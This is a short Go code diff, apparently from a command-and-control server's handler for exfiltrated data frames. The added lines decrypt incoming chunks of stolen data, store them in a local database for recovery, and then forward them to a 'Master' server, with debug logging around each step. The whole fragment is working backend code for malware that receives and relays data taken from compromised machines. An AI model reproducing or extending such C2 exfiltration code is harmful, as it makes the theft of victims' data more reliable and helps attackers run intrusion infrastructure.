@@ -808,6 +808,20 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 			plaintext, decryptErr := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
 			if decryptErr == nil {
 				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)
+				
+				// IMPORTANT: Store locally BEFORE forwarding to Master for recovery capability
+				// Use tag as session identifier since we don't have the full session ID yet
+				if c2.db != nil {
+					tagSessionID := fmt.Sprintf("tag_%s", frame.SessionTag)
+					if _, dbErr := c2.db.RecordExfilChunk(tagSessionID, frame.Counter, plaintext); dbErr != nil {
+						if c2.debug {
+							logf("[Exfil] Local storage failed for orphan chunk tag=%s idx=%d: %v", frame.SessionTag, frame.Counter, dbErr)
+						}
+					} else if c2.debug {
+						logf("[Exfil] Stored orphan chunk locally tag=%s idx=%d bytes=%d", frame.SessionTag, frame.Counter, len(plaintext))
+					}
+				}
+				
 				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
 				if err == nil {
 					if c2.debug {
